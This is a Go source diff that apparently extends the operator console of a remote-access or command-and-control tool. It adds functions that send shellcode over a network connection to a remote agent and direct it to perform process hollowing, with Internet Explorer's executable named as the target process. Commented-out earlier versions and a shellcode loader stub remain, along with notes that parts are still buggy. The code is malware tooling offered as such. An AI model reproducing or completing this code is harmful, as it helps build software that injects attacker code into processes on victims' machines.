@@ -162,3 +162,141 @@ func pwd(conn *net.Conn) {
 	fmt.Println(reply)
 	fmt.Println()
 }
+
+// Still doesnt work. Potentially Client Side issue ?
+// func hollow(conn *net.Conn, filePathLocal string, filePathTarget string) {
+// 	fileContent, err := os.ReadFile(filePathLocal)
+// 	if err != nil {
+// 		fmt.Println("Couldn't read the file !")
+// 		return
+// 	}
+// 	lenContent := strconv.Itoa(len(filePathLocal))
+// 	// fmt.Println(lenContent)
+// 	// os.Exit(0) //Remove this later is just for testing
+// 	(*conn).Write([]byte("hollow\n"))
+// 	(*conn).Write([]byte(lenContent))
+// 	(*conn).Write([]byte(fileContent))
+// 	buffer := make([]byte, 4000)
+// 	read_len, err := (*conn).Read(buffer)
+// 	if read_len == 0 {
+// 		(*conn).Close()
+// 		fmt.Println("Error")
+// 		return
+// 	}
+// 	if err != nil {
+// 		(*conn).Close()
+// 		fmt.Println("Error")
+// 		return
+// 	}
+// 	result := string(buffer[:read_len])
+// 	if result != "OK" {
+// 		fmt.Println("Somethig Went Wrong")
+// 		fmt.Println(result)
+// 		return
+// 	}
+// 	fmt.Println("Commencing Process Hollowing ...")
+// 	(*conn).Write([]byte(filePathLocal))
+// }
+
+// Impliment this
+func hollow2(conn *net.Conn, filePathLocal string, filePathRemote string) {
+	fileContent, err := os.ReadFile(filePathLocal)
+	if err != nil {
+		fmt.Println("Couldn't read the file on the local machine !")
+		return
+	}
+	//now we enter the hollowing function
+	buffer := make([]byte, 1000000) //Fix buffer size later
+	fmt.Println("[*]Sending Signal ...")
+	(*conn).Write([]byte("hollow\n"))
+	read_len, err := (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("Error with length of Buffer")
+		return
+	}
+	bufferSnapped := buffer[:read_len]
+	bufferStr := string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Couldn't initiate Hollowing")
+	}
+	fmt.Println("[+]Signal was recieved and acknowledged")
+	//buffer = nil
+
+	//Write the remote path
+	fmt.Println("[*]Writing the Remote Path ...")
+	(*conn).Write([]byte(filePathRemote))
+	read_len, err = (*conn).Read(buffer)
+	fmt.Println(read_len)
+	if err != nil {
+		fmt.Println("Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 { //Its getting bugged here
+		fmt.Println("Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]The Remote File Does Not Exist")
+		return
+	}
+	fmt.Println("[+]The Remote File Exists !")
+	//buffer = nil //DO NOT SET THE BUFFER TO NIL IT CRASHES SHIT
+
+	//Write the contents of the local file
+	fmt.Println("[*]Transferring shellcode ...")
+	(*conn).Write(fileContent)
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Error sending the shellcode")
+		return
+	}
+	fmt.Println("[+]Shellcode sent successfully !")
+	//Add some more checks here
+	fmt.Println("Process Hollowing Successful !")
+}
+
+func hollow4(conn *net.Conn) {
+	(*conn).Write([]byte("hollow\n"))
+}
+
+// Impliment this
+// func load2(conn *net.Conn, fileWShellcode string, code string) {
+// 	fmt.Println("Good luck")
+// 	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
+// 	if err != nil {
+// 		fmt.Println("Couldn't read the file !")
+// 		return
+// 	}
+// 	(*conn).Write([]byte(code))
+// 	(*conn).Write(file)
+// }
+
+func check(conn *net.Conn) {
+	buffer := make([]byte, 20000)
+	(*conn).Write([]byte("check\n"))
+	read_len, _ := (*conn).Read(buffer)
+	bufferSnapped := buffer[:read_len]
+	buffStr := string(bufferSnapped)
+	fmt.Println(buffStr)
+	if buffStr != "OK\n" {
+		fmt.Println("Something went wrong")
+		return
+	}
+	(*conn).Write([]byte("C:\\Program Files\\Internet Explorer\\iexplore.exe"))
+}
